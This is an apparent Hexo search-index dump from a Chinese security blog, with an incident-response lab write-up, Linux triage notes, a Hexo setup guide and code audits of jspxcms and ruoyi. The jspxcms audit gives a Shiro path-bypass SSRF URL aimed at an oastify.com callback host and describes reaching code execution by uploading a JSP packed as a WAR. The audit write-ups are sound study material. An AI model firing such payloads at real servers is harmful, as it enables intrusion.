全盘扫描病毒","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://dale.us.kg/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应/windows/实战","slug":"应急响应-windows-实战","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows-%E5%AE%9E%E6%88%98/"}]},{"title":"应急响应靶机-Linux(1)-实战","slug":"应急响应靶机-Linux(1)-实战","date":"2024-10-28T09:55:21.000Z","updated":"2024-11-09T10:19:19.352Z","comments":true,"path":"2024/10/28/应急响应靶机-Linux(1)-实战/","permalink":"http://dale.us.kg/2024/10/28/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA-Linux(1)-%E5%AE%9E%E6%88%98/","excerpt":"","text":"2024-10-28🌱湖州: 🌦 🌡️+17°C 🌬️↓13km&#x2F;h 靶场来源https://mp.weixin.qq.com/s/gCWGnBiwbqSnafXU1apJCA 账户密码是defend 挑战内容前景需要：小王急匆匆地找到小张，小王说”李哥，我dev服务器被黑了”,快救救我！！ 挑战内容： 黑客的IP地址 遗留下的三个flag 其他详细的信息，在以上的链接中均已提及，本文仅通过实验来验证巩固自己的应急响应知识 基础信息检查 拿到这个环境后，先进行一些常规命令检查和一些常见文件的检查 查看系统历史命令 正常来说攻击者为了隐藏踪迹一般都会清除历史命令，但是以防万一还是查看下 12345先是普通用户的历史命令history然后进入到root用户，查看历史命令 结果发现第一个flag在root用户的历史命令中就出来了flag&#123;thisismybaby&#125; 查看是否有可疑用户12cat /etc/passwdcat /etc/shadow 并没有发现可以用户信息 查看命令行配置文件在终端运行时会默认加载的配置文件，在用户的根目录下这里是.bash_profile，还有.bashrc等隐藏文件 1cat .bash_profile defend用户的配置文件也查看了，并无异常 查看登陆记录查看登陆成功日志12345显示用户的最近的登录日志，实际上是查看的是wtmp日志，位于/var/log/wtmp文件last若是没有last命令的话，可以使用以下命令达到一样的效果cat /var/log/wtmp | strings 可疑IP：192.168.75.129 查看登陆失败日志攻击者可能进行过爆破密码登录，查看可以的失败登陆记录 1sudo cat /var/log/btmp | strings 果然进行了很多次的ssh登录失败记录，这一步获得的IP地址也是192.168.75.129，大概率就是攻击者IP 系统启动检查启动执行文件检查 查看&#x2F;etc&#x2F;rc.local centos中用户可以在其中添加脚本命令，系统在启动时加载，centos6中可以直接使用，但是centos7中需要在设置中允许 1cat /etc/rc.local 发现第二个flag：flag&#123;kfcvme50&#125; 检查下执行权限，果然赋予了执行权限 自启动检查 查看可疑的自启动的服务，有可能是攻击者留下的后门 1systemctl list-unit-files --type=service | grep enable 没有发现什么可疑的服务 系统安装包检查该检查的都检查了，但是始终找不到第三个flag，从前两个flag来看，攻击者已经得到了用户权限，并且做了后门，并且有爆破ssh爆破的尝试，极有可能是通过ssh登陆进来的 是在没啥思路了，于是使用系统安装包检查，检查一下到底修改了哪些应用的配置吧 123校验所有的安装的rpm包rpm -V -a 发现redis.conf被修改过，很可疑，检查一下 1cat /etc/redis.conf 发现第三个flag：flag&#123;P@ssW0rd_redis&#125; 至此，靶机的要求全部结束，提交flag 总结应急响应的时候站在攻击者的角度，进行攻击模拟可能更加有效率，常规的检查有时候检查不出来的，站在攻击者的角度进行测试说不定就找出问题了。","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://dale.us.kg/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应/Linux/实战","slug":"应急响应-Linux-实战","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E5%AE%9E%E6%88%98/"}]},{"title":"Linux搭建Hexo博客","slug":"Linux搭建Hexo博客","date":"2024-10-27T11:01:34.000Z","updated":"2024-11-09T10:19:18.945Z","comments":true,"path":"2024/10/27/Linux搭建Hexo博客/","permalink":"http://dale.us.kg/2024/10/27/Linux%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"2024-10-27🌱湖州: 🌦 🌡️+16°C 🌬️↓12km&#x2F;h 更新源添加源，终端输入：sudo vim &#x2F;etc&#x2F;apt&#x2F;sources.list 下列源选择部分添加： 官方源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 阿里云源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 清华大学源deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free浙大源deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free东软大学源deb http://mirrors.neusoft.edu.cn/kali kali-rolling&#x2F;main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling&#x2F;main non-free contrib新加坡kali源deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contribdeb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib163 Kali源deb http://mirrors.163.com/debian wheezy main non-free contribdeb-src http://mirrors.163.com/debian wheezy main non-free contrib apt-get update更新 下载依赖git自带 node 1apt install node npm 1apt install npm hexo-cli 1npm install -g hexo-cli` 新建博客目录1hexo init 下载插件 上传GitHub插件 npm install hexo-deployer-git- 插入图片插件 npm install https://github.com/CodeFalling/hexo-asset-image- 图片插件下载好后需要将根目录中的config文件的post_asset_folder改成true 注意：这些一定要安装好，不要只是配一下环境变量，从头安装保险一点 hexo主题hexo-theme-yilia-plus下载cd .&#x2F;themes&#x2F;git clone –depth&#x3D;1 https://github.com/JoeyBling/hexo-theme-yilia-plus.git 显示文章的部分内容显示文章的部分内容 1&lt;!-- more --&gt; 更新12cd themes/yilia-plus git pull 使用想要的主题需要在config文件配置theme的名称 hexo-theme-reimuhttps://github.com/D-Sketon/hexo-theme-reimu?tab=readme-ov-file hexo-theme-anzhiyuGit 安裝在博客根目录里安装最新版【推荐】 1git clone -b main https://github.com/anzhiyu-c/hexo-theme-anzhiyu.git themes/anzhiyu 应用主题修改 hexo 配置文件_config.yml，把主题改为anzhiyu 1theme: anzhiyu 如果你没有 pug 以及 stylus 的渲染器，请下载安装： npm install hexo-renderer-pug hexo-renderer-stylus --save 覆盖配置覆盖配置可以使主题配置放置在 anzhiyu 目录之外，避免在更新主题时丢失自定义的配置。 通过 Npm 安装主题的用户可忽略，其他用户建议学习使用。 macos&#x2F;linux 在博客根目录运行 1cp -rf ./themes/anzhiyu/_config.yml ./_config.anzhiyu.yml windows 复制/themes/anzhiyu/_config.yml此文件到 hexo 根目录，并重命名为_config.anzhiyu.yml 以后如果修改任何主题配置，都只需修改 _config.anzhiyu.yml 的配置即可。 注意： 只要存在于 _config.anzhiyu.yml 的配置都是高优先级，修改原 _config.yml 是无效的。 每次更新主题可能存在配置变更，请注意更新说明，可能需要手动对 _config.anzhiyu.yml 同步修改。 想查看覆盖配置有没有生效，可以通过 hexo g --debug 查看命令行输出。 如果想将某些配置覆盖为空，注意不要把主键删掉，不然是无法覆盖的 butterfly官方文档https://butterfly.js.org/posts/21cfbf15/ hexo基础操作 启动本地服务 1hexo -s 清理缓存 1hexo clean 生成静态文件 1hexo g 推送到github 1hexo d 新建文章 1hexo n &quot;文件名&quot; hexo进阶添加分类1hexo new page categories 然后再去生成的source\\categories中的index.md中添加type: categories 然后在文章的头中添加分类属性即可，只能有一个分类 改变新建文件的模板scaffolds目录中储存的是新建文件的模板，添加categories属性，这样新建文件的时候就会有这个属性了 部署到github _config.yml文件配置 在文件的最后一行添加这个配置 123456deploy: type: git repo: https://github.com/用户名/用户名.github.io.git （或者git@github.com:用户名/用户名.github.io.git）【推荐】 branch: main 在本地生成新的sshkey文件 输入命令：cd ~/.ssh进入.ssh文件夹输入命令：ssh-keygen -t rsa -C &#39;注册时的邮箱地址&#39; 然后到GitHub，去设置里面将生成的pub文件的内容粘贴到新建的ssh中 输入命令（git）：ssh -T git@github.com 并且输入yes之后，行末尾会显示你的用户名 接着在本地绑定与Github的用户名和邮箱（git）输入命令：git config –global user.name “注册时用户名”输入命令：git config –global user.email “注册时邮箱” 随机图床https://t.mwm.moe/moe/https://t.mwm.moe/fjhttp://www.98qy.com/sjbz/api.php","categories":[{"name":"网站建设","slug":"网站建设","permalink":"http://dale.us.kg/categories/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"}],"tags":[{"name":"网站建设","slug":"网站建设","permalink":"http://dale.us.kg/tags/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"}]},{"title":"jspxcms代码审计","slug":"jspxcms代码审计","date":"2024-10-24T06:12:46.000Z","updated":"2024-11-09T10:19:18.733Z","comments":true,"path":"2024/10/24/jspxcms代码审计/","permalink":"http://dale.us.kg/2024/10/24/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"2024-10-24🌱湖州: ☀️ 🌡️+20°C 🌬️↙11km&#x2F;h 废话不多说,直接开始审计参考： https://www.cnblogs.com/yokan/p/16248509.html https://0xf4n9x.github.io/jspxcms-code-audit-learn.html 源码地址https://www.ujcms.com/uploads/jspxcms-9.5.0-release-src.zip 部署java8+mysql5.7.26 这里直接使用phpstudy部署mysql环境，然后启动 然后执行sql命令123create database jspxcms_testuse jspxcms_testsource mysql.sql 我这里使用DataGrip连接数据库，然后执行database目录下的sql文件 配置idea在application.properties中设置数据库的名称、密码等等 然后配置运行文件jdk8，项目结构中语言等级选择8 然后直接运行即可 技术栈 SpringMVC 框架、Spring Data JPA 框架，Hibernate 作为数据库持久化框架，Shiro 作为安全框架，以及 Freemarker 模版引擎。 一般项目的框架需要有如下 MVC模块框架 持久化模块：各种JPA、Hibernate、Mybatis 安全框架：Shiro、Spring Security、Keycloak等 审计步骤 jspxcms是基于maven管理的项目，首先查看pom.xml文件 jspxcms的后台地址时cmscp，用户名时admin，密码为空 若是Gradle管理的项目，则查看对应的Gradle文件 通过pom.xml文件可以发现SpringMVC 框架、Spring Data JPA 框架，Hibernate 作为数据库持久化框架，Shiro 作为安全框架，以及 Freemarker 模版引擎。 根据功能点审计 登录功能信息管理功能发表评论查看评论等等….. sql注入漏洞审计 使用codeql扫描123https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-089/SqlTainted.qlhttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-089/SqlUnescaped.ql 因为持久化框架使用的是hibernate，所以可以根据hibernat的关键词搜索需要sql查询的地方 hibernate框架一般不太有sql注入漏洞 12关键词 @Query 使用idea自带的搜索功能查找 经过分析，全都有占位符，发现没有sql注入漏洞 SSRF漏洞审计在审计 SSRF 漏洞前，需要知道 Java 中的一些常见的对外发送请求的方法。 12345678910111213Socket() OkHttpClient.newCall(request).execute() ImageIO.read() HttpClient.execute() HttpClient.executeMethod() HttpURLConnection.connect() HttpURLConnection.getInputStream() URL.openConnection() URL.openStream() HttpServletRequest() BasicHttpEntityEnclosingRequest() DefaultBHttpClientConnection() BasicHttpRequest() codeql扫描1https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-918/RequestForgery.ql 如上图，扫描出可能存在的漏洞有6个，但是步骤那么多的一般是没有的，看最后两个步骤少的即可 第一个漏洞source：CollectController.java中调用的fetchHtml方法sink：Collect.java中的fetchHtml方法的httpclient.execute()方法 可以根据codeql一步步的跟踪即可 使用idea来寻找这个漏洞 路由是fetch_url.do，url参数可控，调用Collect.fetchHtml方法点进去查看Collect.fetchHtml方法，发现最后使用了httpclient.execute方法 而且没有任何过滤，最后也是直接通过writeHtml方法输出了html内容 然后查看Application.java文件，发现注册的后台地址为 所以ssrf漏洞地址是：/cmscp/ext/collect/fetch_url.do?url=http://127.0.0.1:80 需要先登录才能够利用，用户名是admin，密码是空发现若是不存在的端口就是如下因为是shiro框架鉴权，他这里的版本是1.3.2，存在CVE-2019-12422漏洞，可以进行权限绕过， 直接使用如下的payload即可绕过实现ssrf 1http://10.194.7.167:8080/;/cmscp/ext/collect/fetch_url.do?url=http://69dso2emymdj7jwliwga9vvshjnab0zp.oastify.com 第二个漏洞ueditorCatchImage方法中存在openConnection()的调用 ueditorCatchImage方法有在两个位置实现 一个在fore，一个在back，前者是前端，后者是后端，这里当然选择前端的实现路由是&#x2F;ueditor，获取参数action的值，若值为catchimage则调用ueditorCatchImage方法，然后调用父类的ueditorCatchImage方法最后调用了request中的source[]参数的值，然后执行srcUrl.openConnection()从而触发ssrf漏洞 但是可以发现，下面的代码中会判断是否是80、443端口，并且会将错误不打印出来，修复了ssrf漏洞 所以9.5.0版本这里没有ssrf漏洞了 手动审计方法若是不用工具扫描，全局搜索以下的关键词，然后一步步的找入口点 123HttpClient.execute()URL.openConnection() 或者根据功能点来查找，一般是在请求文件的接口有可能会出现ssrf漏洞 xss漏洞审计 使用codeql扫描1ql\\java\\ql\\src\\Security\\CWE\\CWE-079\\XSS.ql 这个扫描出来不太靠谱 手动审计 主要关注评论区 输入点 输出点 使用burp抓包，找到输入点的路由为comment_submit，然后寻找源码中的位置经过一系列的判断，是否登陆啊啥的，然后就是没有过滤输入，直接储存进数据库 但是没有执行xss 查看所有评论页面，发现输出被转义了，这时候可以审计pom.xml文件查看模板插件 查看输出，搜索fid，找到comment_list路由 发现它查看评论时将sys_comment_list.html传入getTemplate方法中 全局搜索sys_comment_list.html，发现这个文件 这个是对评论进行了转义，所以xss才没有触发 定位到sys_comment_list.html文件的目录，寻找是否没有进行转义的模板文件 发现sys_member_space_comment.html文件没有对comment进行了转义 因为我的是9.5.0版本，这个xss漏洞已经被修复了，所以我将转移语句删除成功复现全局搜索sys_member_space.html，发现在sys_member_space.html中当type&#x3D;comment时又对sys_member_space_comment.html进行了包含全局搜索sys_member_space.html，发现入口点 成功执行xss rce漏洞审计Zip Slip 任意文件覆盖漏洞根据网上所说有一个Zip Slip 任意文件覆盖漏洞，但是需要使用tomcat部署才行，这里就简单的分析以下源码就行了，懒得搭建了 产生漏洞的原因在于调用了AntZipUtils.unzip，但是没有对压缩包中的内容进行过滤，导致上传的包含jsp文件的压缩包自解压 正常来说有一个过滤器使得jsp文件在访问前会被加上/jsp，但是我这个9.5.0版本居然修复了这个漏洞，它不仅仅是加上/jsp，它默认还不允许JSP文件被访问，如下图所示 所以我为了复现成功，将allowed改成了true 在后台上传一个jsp文件的内容后访问结果如图上传zip文件也是一样的，会将里面的文件直接解压出来。但是jsp文件还是无法访问 若是使用tomcat部署的话，可以使用如下命令将jsp打包成war包 1jar -cf rce.war ./rce.jsp 然后直接上传，tomcat会将war包当成一个项目，就能够成功访问了 依赖漏洞审计 使用codeql扫描123https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-1104/MavenPomDependsOnBintray.qlhttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-829/InsecureDependencyResolution.ql 扫描结果还没有idea自带的功能强 点击idea左下角的感叹号，然后选择Vulnerablr dependies，所有依赖漏洞给就会出现在左侧 这里主要就对几个漏洞进行实验，不然也太多了 shiro项目使用的shiro版本时1.3.2 这个版本存在很多的认证绕过漏洞，还有一个Cookie填充漏洞 CVE-2021-41303 Apache Shiro before 1.8.0, when using Apache Shiro with Spring Boot, a specially crafted HTTP request may cause an authentication bypass. Users should update to Apache Shiro 1.8.0. CVE-2022-40664 Apache Shiro before 1.10.0, Authentication Bypass Vulnerability in Shiro when forwarding or including via RequestDispatcher. CVE-2022-32532 Apache Shiro before 1.9.1, a RegexRequestMatcher can be misconfigured to be bypassed on some servlet containers. Applications using RegExPatternMatcher with . in the regular expression are possibly vulnerable to an authorization bypass CVE-2019-12422 Apache Shiro before 1.4.2, when using the default “remember me” configuration, cookies could be susceptible to a padding attack. 也就是常用的shiro721漏洞 CVE-2020-17523Apache Shiro before 1.7.1, when using Apache Shiro with Spring, a specially crafted HTTP request may cause an authentication bypass 发现依赖存在漏洞后就可以搜索历史漏洞，然后利用公开的POC进行复现 CVE-2019-12422在shiro&lt;&#x3D;1.2.4版本中AES加密的key是硬编码在源码中，而在这个版本使用的加密方式是AES-CBC，其中的ase加密的key基本由系统随机生成 通过padding attack可以破解密钥，然后使用破解的key来构造cookie 利用条件 需要知道登陆成功的cookie中的rememberMe的值 有利用链，例如cb链，或者是cc链之类的 参考：https://www.cnblogs.com/dhan/p/18423531 fastjson虽然本项目使用的版本1.2.3存在漏洞，但是项目中貌似没使用，没有审计出漏洞 审计方法：全局搜索json.parseObject 没有在项目中找到引用，估计是没有漏洞 log4j2本项目版本：1.2.17搜索了一下发现没有调用的，审计不出来漏洞","categories":[{"name":"java安全","slug":"java安全","permalink":"http://dale.us.kg/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计/java/实战","slug":"代码审计-java-实战","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"}]},{"title":"ruoyi-vue-pro代码审计","slug":"ruoyi-vue-pro代码审计","date":"2024-10-23T14:14:16.000Z","updated":"2024-11-09T10:19:19.031Z","comments":true,"path":"2024/10/23/ruoyi-vue-pro代码审计/","permalink":"http://dale.us.kg/2024/10/23/ruoyi-vue-pro%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"2024-10-23🌱湖州: ☀️ 🌡️+13°C 🌬️←4km&#x2F;h 线上实践项目地址：http://zlbz.uzz.edu.cn/login 源码项目地址：https://github.com/YunaiV/ruoyi-vue-pro 使用CodeQL进行分析 生成数据库 1codeql database create D:/tools/CodeQL/databases/codeql_ruoyi-vue-pro --language=&quot;java&quot; --command=&quot;mvn clean install --file pom.xml&quot; --source-root=D:\\JavaProgram\\ruoyi-vue-pro\\ 这里审计的是最新版本的，并没有发现什么漏洞，果然经常更新的项目是没有啥漏洞的","categories":[{"name":"java安全","slug":"java安全","permalink":"http://dale.us.kg/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计/java/实战","slug":"代码审计-java-实战","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"}]},{"title":"使用codeql进行代码审计","slug":"使用codeql进行代码审计","date":"2024-10-18T06:37:35.000Z","updated":"2024-11-09T10:19:19.310Z","comments":true,"path":"2024/10/18/使用codeql进行代码审计/","permalink":"http://dale.us.kg/2024/10/18/%E4%BD%BF%E7%94%A8codeql%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"2024-10-18🌱湖州: 🌦 🌡️+28°C 🌬️→10km&#x2F;h 前提按照我之前的文章CodeQL的使用下载配置好环境 codeql vscode 步骤🎏准备阶段首先打开以下的网址，里面是官方提供的ql查询方法，可以直接使用 https://codeql.githubdocs.cn/codeql-query-help/java/ 创建数据库1codeql database create D:/tools/CodeQL/databases/codeql_ruoyi-wechat-mp --language=&quot;java&quot; --command=&quot;mvn clean install --file pom.xml&quot; --source-root=D:\\JavaProgram\\ruoyi-wechat-mp\\ 类似如上的命令， 打开vscode，导入数据库 导入刚刚生成的数据库 xss审计脚本位置： codeql/java/ql/src/Security/CWE/CWE-079/XSS.ql SSRF审计脚本位置 codeql/java/ql/src/Security/CWE/CWE-918/RequestForgery.ql","categories":[{"name":"java安全","slug":"java安全","permalink":"http://dale.us.kg/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计/java/实战","slug":"代码审计-java-实战","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"}]},{"title":"Linux应急响应流程","slug":"Linux应急响应流程","date":"2024-09-26T14:23:55.000Z","updated":"2024-11-09T10:19:18.901Z","comments":true,"path":"2024/09/26/Linux应急响应流程/","permalink":"http://dale.us.kg/2024/09/26/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%B5%81%E7%A8%8B/","excerpt":"","text":"✍内容查看系统基本信息 系统版本uname -a 安装时间stat &#x2F;root&#x2F;anaconda-ks.cfgstat &#x2F;lost+found&#x2F; 获取主机名cat &#x2F;etc&#x2F;hostname 系统目前安装的rpm rpm -qa rpm -V -a 查看防火墙规则iptables-save &gt; path 查看当前的进程ps -aux 查看加载的所有模块lsmod 网络信息 网卡信息ip a dns信息 cat &#x2F;etc&#x2F;resolv.conf 路由表 route -n arp表arp -a 网络端口信息netstat -antpul 日志信息&#x2F;var&#x2F;log&#x2F;cron*&#x2F;var&#x2F;log&#x2F;mail*&#x2F;var&#x2F;log&#x2F;mysqld.log*&#x2F;var&#x2F;log&#x2F;yum.log*等等","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://dale.us.kg/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应/Linux/笔记","slug":"应急响应-Linux-笔记","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E7%AC%94%E8%AE%B0/"}]},{"title":"Linux常规检查","slug":"Linux常规检查","date":"2024-09-26T10:30:30.000Z","updated":"2024-11-09T10:19:18.841Z","comments":true,"path":"2024/09/26/Linux常规检查/","permalink":"http://dale.us.kg/2024/09/26/Linux%E5%B8%B8%E8%A7%84%E6%A3%80%E6%9F%A5/","excerpt":"","text":"✍内容文件检查🎇历史命令 root用户执行过的历史命令 &#x2F;root&#x2F;.bash_history 对应的用户执行过的历史命令 &#x2F;home&#x2F;{username}&#x2F;.bash_history 当前用户执行过的历史命令 history 1、快速备份历史命令，然后检查 1cd /tmp 1mkdir cmd 1cd cmd 1cp ~/.bash_history root_history 123find /home -name .bash_history -exec cat &#123;&#125; \\; &gt; /tmp/cmd/user_historyOR find /home -name .bash_history | xargs cat &gt; /tmp/cmd/user_history 注意：一般是.bash_history，但是具体的看安装的命令行是什么，比如kali使用的是zsh，所以历史命令在.zsh_history中 🎇系统关键文件&#x2F;etc&#x2F;passwd用户和密码&#x2F;etc&#x2F;shadow用户和密码&#x2F;etc&#x2F;group群组&#x2F;etc&#x2F;profile运行的初始文件，root目录下和用户目录下也有，可以自定义变量 &#x2F;root&#x2F;.bashrc或者&#x2F;root&#x2F;.zshrc一些终端设置&#x2F;root&#x2F;.bash_logout退出时做的命令 .ssh目录下的authorized_keys文件 攻击者可以将自己的ssh的公钥上传到这个文件夹，然后可以通过密钥登录ssh 这些关键性文件也是先备份一下 🎇系统关键目录&#x2F;tmp&#x2F;var&#x2F;tmp&#x2F;dev&#x2F;shm&#x2F; 以上的几个目录默认可读可写，一般攻击者的自动化脚本都会在这几个目录 命令检查&#x2F;usr&#x2F;bin&#x2F;netstat&#x2F;usr&#x2F;bin&#x2F;ps&#x2F;usr&#x2F;sbin&#x2F;lsof&#x2F;usr&#x2F;bin&#x2F;md5sum&#x2F;usr&#x2F;sbin&#x2F;ss&#x2F;usr&#x2F;bin&#x2F;stat 以上的命令可能会被串改，所以必须要检查下 系统安装包检查centos列出所有的安装的rpm包rpm -qa校验所有的安装的rpm包rpm -V -a校验指定的文件或者命令rpm -V -f &#x2F;etc&#x2F;sysconfig 日志文件检查secure 记录与安全相关的信息 lastlog 用户最后一次登录时间，lastlog命令查看 wtmp 永久的记录用户的登录、注销及系统的启动、停机的事件 btmp 尝试登录失败的日志 messages 各种系统守护进程、用户程序和内核相关信息 cron crontab日志 audit&#x2F;* 监控系统调用 boot.log 启动信息相关日志 系统启动检查&#x2F;etc&#x2F;rc.local centos中用户可以在其中添加脚本命令，系统在启动时加载，centos6中可以直接使用，但是centos7中需要在设置中允许 systemctl list-unit-files –type&#x3D;service | grep enable 查询系统自启动","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://dale.us.kg/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应/Linux/笔记","slug":"应急响应-Linux-笔记","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E7%AC%94%E8%AE%B0/"}]},{"title":"Linux常用命令","slug":"Linux常用命令","date":"2024-09-26T06:10:31.000Z","updated":"2024-11-09T10:19:18.789Z","comments":true,"path":"2024/09/26/Linux常用命令/","permalink":"http://dale.us.kg/2024/09/26/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"✍内容statnetstat123456789-n 不适用域名，使用IP-a 显示所有的sockets连接-t 显示所有的tcp连接-u 显示所有的udp连接-p 显示进程号-l 显示附加信息一般是直接使用netstat -antup即可 lsof12345678lsof -c sshd显示服务sshd打开的文件lsof -p pid显示进程号为pid的进程情况lsof +d /tmp显示目录下被进程打开的文件lsof +D /tmp递归显示目录下被进程打开的文件 ps12ps -aux top动态显示内存占用情况 grep\\12-i 忽略大小写-r 排除匹配到的项目 find12345678910find path -name 项目在path路径下寻找指定项目find path -perm 777在path路径下寻找指定权限的项目find path -mtime -n在path路径下修改时间小于n天的find path -mtime +n在path路径下修改时间大于n天的 tcpdump123456789101112tcpdump -i eth0抓取网卡eth0的流量tcpdump tcp抓取tcp的流量tcpdump port 53抓取指定端口流量tcpdump -w wireshark.pcap抓取流量储存为wireshark包 md5sum计算md5值 strings快速打印文件中的字符，常用来提取二进制文件中字符 ssh使用公钥登录ssh 生成公私钥 1ssh-keygen 将生成的公钥复制到root或者其他的用户的.ssh目录下 1cat rsa_pub &gt; /root/.ssh/authorized_keys 修改ssh配置文件的内容如下 1vim /etc/ssh/sshd_config 将下面的PubkeyAuthentication取消注释，并且改成yes将PasswordAuthentication取消注释，并且改成no，若是不修改的话则会既需要密码，也需要公钥登录 修改完后需要重启ssh服务 1service ssh restart xshell登录 方法选择Public key登录，然后登录时根据提示选择对应的rsa私钥文件即可，注意要使用对应的用户名登录 Linux登录 ssh &#x72;&#111;&#111;&#x74;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#55;&#52;&#46;&#49;&#51;&#48; -i .&#x2F;rsa_private","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://dale.us.kg/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应/Linux/笔记","slug":"应急响应-Linux-笔记","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E7%AC%94%E8%AE%B0/"}]},{"title":"ruoyi-wechat-mp代码审计","slug":"ruoyi-wechat-mp代码审计","date":"2024-06-11T01:32:50.000Z","updated":"2024-11-09T10:19:19.083Z","comments":true,"path":"2024/06/11/ruoyi-wechat-mp代码审计/","permalink":"http://dale.us.kg/2024/06/11/ruoyi-wechat-mp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"✍内容部署ruoyi-wechat-mp下载1git clone https://gitee.com/zhangjqi2015/ruoyi-wechat-mp.git ruoyi官网文档https://doc.ruoyi.vip/ruoyi/document/hjbs.html#%E9%83%A8%E7%BD%B2%E7%B3%BB%E7%BB%9F 安装参考文档https://blog.csdn.net/m0_67376124/article/details/127617498 修改数据库的连接配置打开ruoyi-wechat-mp/ruoyi-admin/src/main/resources/application-druid.yml 1234567j# 主库数据源 master: url: jdbc:mysql://localhost:3306/ry?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8 username: root password: root其中ry是我的数据库名 执行sql文件我是用navicat新建了一个数据库，然后执行sql命令 1将ruoyi-wechat-mp\\sql中的所有sql文件执行即可 下载redishttps://github.com/tporadowski/redis/releases 下载便携版就行了 启动前端1234打开ruoyi-wechat-mp/ruoyi-ui文件夹，在这里使用cmd命令 npm install 然后启动环境 1npm run dev 这里遇到了一个问题 Error: error:0308010C:digital envelope routines::unsupported bug解决报错原因： 主要是因为 nodeJs V17 版本发布了 OpenSSL3.0 对算法和秘钥大小增加了更为严格的限制，nodeJs v17 之前版本没影响，但 V17 和之后版本会出现这个错误。 我的node版本是v20+ 12345678910111213141516171819在项目中 package.json 的 scripts 中新增 SET NODE_OPTIONS=--openssl-legacy-provider添加前：&quot;scripts&quot;: &#123;&quot;dev&quot;: &quot;vue-cli-service serve&quot;, &quot;build:prod&quot;: &quot;vue-cli-service build&quot; &#125;,添加后:&quot;scripts&quot;: &#123;&quot;dev&quot;: &quot;SET NODE_OPTIONS=--openssl-legacy-provider &amp;&amp; vue-cli-service serve&quot;, &quot;build:prod&quot;: &quot;SET NODE_OPTIONS=--openssl-legacy-provider &amp;&amp; vue-cli-service build&quot; &#125;, 参考：https://blog.csdn.net/scholar_man/article/details/134491200 测试环境启动redis-server 启动mysql 启动后端idea中直接运行就好了 启动前端npm run dev Ruoyi框架大致成功了 代码审计线上实践项目地址：https://pazy.uzz.edu.cn/ 使用CodeQL进行分析 生成数据库 1codeql database create D:/tools/CodeQL/databases/codeql_ruoyi-wechat-mp --language=&quot;java&quot; --command=&quot;mvn clean install --file pom.xml&quot; --source-root=D:\\JavaProgram\\ruoyi-wechat-mp\\ 使用命令行运行扫描12codeql database analyze D:\\tools\\CodeQL\\databases\\codeql_ruoyi-wechat-mp D:/tools/CodeQL/ql/java/ql/src/codeql-suites/java-security-extended.qls --format=csv --output=java-results.csv 或者是使用vscode查看 导入数据库 运行指定的文件或者文件夹 